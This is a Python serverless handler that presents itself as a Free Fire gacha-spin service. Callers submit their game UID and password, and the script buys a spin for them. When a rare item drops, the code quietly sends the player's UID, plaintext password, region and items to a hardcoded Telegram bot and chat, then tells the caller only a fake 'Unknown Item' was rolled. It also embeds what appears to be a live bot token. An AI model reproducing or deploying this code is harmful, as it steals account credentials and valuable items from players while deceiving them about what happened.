#!/usr/bin/env python3
"""
Vercel serverless handler — PRANK MODE.
Rare hits are silently forwarded to a Telegram group.
The caller always sees a fake "Unknown Item" (820981015).
"""

import os
import sys
import json
import time
import zlib
import base64
import binascii
import re
import asyncio
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import aiohttp

try:
    import output_pb2
except Exception as e:
    output_pb2 = None
    _PB2_IMPORT_ERROR = str(e)
else:
    _PB2_IMPORT_ERROR = None


# ------------------------------------------------------------------ #
#  CONSTANTS
# ------------------------------------------------------------------ #
EXTERNAL_API_URL = "https://divan-jwt-gen.vercel.app/guest"
RELEASE_VERSION  = "OB55"
DEFAULT_URL      = "https://client.ind.freefiremobile.com"
NARUTO_PAYLOAD   = "D120B9DAAC2C87872B8C115DFD74A832"

# --- PRANK CONFIG ---
FAKE_UNKNOWN_ID  = 820981015              # what the client sees instead of the real drop
TG_BOT_TOKEN     = os.environ.get("TG_BOT_TOKEN", "8677901038:AAEUAHl7wiUxzivL0khjPdMIQtYSas5Gijg")
TG_CHAT_ID       = os.environ.get("TG_CHAT_ID", "-1003684272586")

REGION_URL_MAP = {
    "IND": "https://client.ind.freefiremobile.com",
    "IN":  "https://client.ind.freefiremobile.com",
    "TW":  "https://clientbp.ggpolarbear.com",
    "SG":  "https://clientbp.ggpolarbear.com",
    "ID":  "https://clientbp.ggpolarbear.com",
    "TH":  "https://clientbp.ggpolarbear.com",
    "VN":  "https://clientbp.ggpolarbear.com",
    "BR":  "https://clientbp.ggpolarbear.com",
    "US":  "https://clientbp.ggpolarbear.com",
    "ME":  "https://clientbp.ggpolarbear.com",
    "PK":  "https://clientbp.ggpolarbear.com",
    "BD":  "https://clientbp.ggpolarbear.com",
}

RARE_ITEMS_DB = {
    710047022: "Naruto Bundle",
    903047008: "Loot Box - Body Substitution",
    904047008: "Backpack - Ninja's Scroll",
    907104746: "Gloo Wall - Hokage Rock",
    909047015: "Rasengan - Emote",
}


# ------------------------------------------------------------------ #
#  JWT HELPERS
# ------------------------------------------------------------------ #
def decode_jwt_payload(token: str):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_b64))
    except Exception:
        return None


def pick_url_from_token(token: str, fallback: str) -> str:
    payload = decode_jwt_payload(token)
    if not payload:
        return fallback
    region = (payload.get("lock_region") or payload.get("noti_region") or "").upper()
    return REGION_URL_MAP.get(region, fallback)


# ------------------------------------------------------------------ #
#  GACHA PARSING
# ------------------------------------------------------------------ #
def _extract_ids_from_bytes(data: bytes):
    items = []
    i = 0
    while i < len(data):
        value = 0
        shift = 0
        while i < len(data):
            b = data[i]
            i += 1
            value |= (b & 0x7F) << shift
            if not (b & 0x80):
                break
            shift += 7
        if 100000000 <= value <= 999999999:
            if not any(x["id"] == value for x in items):
                items.append({"id": value, "name": RARE_ITEMS_DB.get(value)})
    return items


def parse_gacha_response(data: bytes):
    items = []

    try:
        if data.startswith(b"\x1f\x8b"):
            data = zlib.decompress(data, 16 + zlib.MAX_WBITS)
    except Exception:
        pass

    if output_pb2 is not None:
        try:
            resp = output_pb2.Garena_420()
            resp.ParseFromString(data)
            for num in re.findall(r"\b(\d{9})\b", str(resp)):
                iid = int(num)
                if 100000000 <= iid <= 999999999 and not any(x["id"] == iid for x in items):
                    items.append({"id": iid, "name": RARE_ITEMS_DB.get(iid)})
        except Exception:
            pass

    if not items:
        try:
            for num in re.findall(r"\d{9}", data.decode("utf-8", errors="ignore")):
                iid = int(num)
                if 100000000 <= iid <= 999999999 and not any(x["id"] == iid for x in items):
                    items.append({"id": iid, "name": RARE_ITEMS_DB.get(iid)})
        except Exception:
            pass

    if not items:
        items = _extract_ids_from_bytes(data)

    return items


# ------------------------------------------------------------------ #
#  TELEGRAM — silent leak of the real drop
# ------------------------------------------------------------------ #
async def send_to_telegram(session, uid, password, region, rare_items):
    if not TG_BOT_TOKEN or not TG_CHAT_ID:
        return  # silently skip if not configured

    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    lines = [
        "🎉 *RARE HIT*",
        f"🆔 UID: `{uid}`",
        f"🔑 Pass: `{password}`",
        f"🌍 Region: `{region}`",
        f"🕒 {ts}",
        "",
        "*Items gained:*",
    ]
    for it in rare_items:
        lines.append(f"• {it['name']} — `{it['id']}`")

    text = "\n".join(lines)
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"

    try:
        async with session.post(
            url,
            json={"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "Markdown"},
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r:
            await r.read()  # drain
    except Exception:
        pass  # never leak errors to the caller


# ------------------------------------------------------------------ #
#  NETWORK
# ------------------------------------------------------------------ #
async def get_token(session, uid, password, retries=3):
    for _ in range(retries):
        try:
            async with session.get(
                EXTERNAL_API_URL,
                params={"uid": uid, "password": password},
                ssl=False,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as res:
                if res.status == 200:
                    data = await res.json()
                    if data.get("status") == "success":
                        tok = data.get("token")
                        if isinstance(tok, str) and len(tok) > 50:
                            return tok
        except Exception:
            await asyncio.sleep(0.4)
    return None


async def gacha_req(session, token, payload, url, max_retries=3):
    if not url.endswith("/PurchaseGacha"):
        url += "/PurchaseGacha"

    headers = {
        "User-Agent": "UnityPlayer/2018.4.12f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
        "Accept": "*/*",
        "Accept-Encoding": "deflate, gzip",
        "Authorization": f"Bearer {token}",
        "X-GA": "v1 1",
        "X-GA-SV": str(int(time.time())),
        "ReleaseVersion": RELEASE_VERSION,
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Unity-Version": "2018.4.12f1",
    }

    last_status = 0
    for _ in range(max_retries):
        try:
            async with session.post(
                url,
                headers=headers,
                data=payload,
                ssl=False,
                timeout=aiohttp.ClientTimeout(total=20),
            ) as res:
                last_status = res.status
                if res.status == 200:
                    return 200, await res.read()
                if res.status in (401, 403):
                    return res.status, None
                await asyncio.sleep(0.2)
        except Exception:
            last_status = 999
            await asyncio.sleep(0.3)
    return last_status, None


# ------------------------------------------------------------------ #
#  CORE PIPELINE
# ------------------------------------------------------------------ #
async def spin(uid: str, password: str, payload_hex: str = None):
    if output_pb2 is None:
        return {"success": False, "error": f"protobuf_load_failed: {_PB2_IMPORT_ERROR}"}

    payload_hex = (payload_hex or NARUTO_PAYLOAD).replace(" ", "")
    try:
        payload = binascii.unhexlify(payload_hex)
    except Exception as e:
        return {"success": False, "error": f"invalid_payload_hex: {e}"}

    async with aiohttp.ClientSession() as session:
        token = await get_token(session, uid, password, 3)
        if not token:
            return {"success": False, "error": "token_fetch_failed"}

        jwt = decode_jwt_payload(token) or {}
        region = jwt.get("lock_region", "UNKNOWN")
        url = pick_url_from_token(token, DEFAULT_URL)

        status, resp = await gacha_req(session, token, payload, url, 3)
        if status != 200 or not resp:
            return {
                "success": False,
                "error": f"gacha_http_{status}",
                "region": region,
            }

        items = parse_gacha_response(resp)

        # ----------------------------------------------------------
        #  PRANK LOGIC
        #  If any *known rare* dropped → leak real info to TG,
        #  then respond as if only an unknown item was rolled.
        # ----------------------------------------------------------
        rare_items = [it for it in items if it["name"] is not None]

        if rare_items:
            await send_to_telegram(session, uid, password, region, rare_items)

            # Return the fake response (one unknown entry per rare, so
            # the count still "feels" natural). ID 820981015 is not in
            # RARE_ITEMS_DB, so name stays null — matching your spec.
            fake_items = [
                {"id": FAKE_UNKNOWN_ID, "name": None}
                for _ in rare_items
            ]
            return {
                "success": True,
                "uid": uid,
                "region": region,
                "items": fake_items,
            }

        # No rare → pass through the normal response (unknowns stay unknown)
        return {
            "success": True,
            "uid": uid,
            "region": region,
            "items": items,
        }


# ------------------------------------------------------------------ #
#  VERCEL HANDLER
# ------------------------------------------------------------------ #
class handler(BaseHTTPRequestHandler):
    def _send_json(self, code: int, obj: dict):
        body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def _run(self, params: dict):
        uid = params.get("uid", [None])[0]
        pwd = params.get("pass", [None])[0] or params.get("password", [None])[0]
        payload_hex = params.get("payload", [None])[0]

        if not uid or not pwd:
            self._send_json(400, {"success": False, "error": "missing_params: uid & pass required"})
            return

        try:
            result = asyncio.run(spin(uid, pwd, payload_hex))
        except Exception as e:
            result = {"success": False, "error": f"internal_error: {e}"}

        self._send_json(200 if result.get("success") else 502, result)

    def do_GET(self):
        parsed = urlparse(self.path)
        self._run(parse_qs(parsed.query))

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8") if length else "{}"
            data = json.loads(body)
            params = {k: [str(v)] for k, v in data.items()}
        except Exception:
            params = {}
        self._run(params)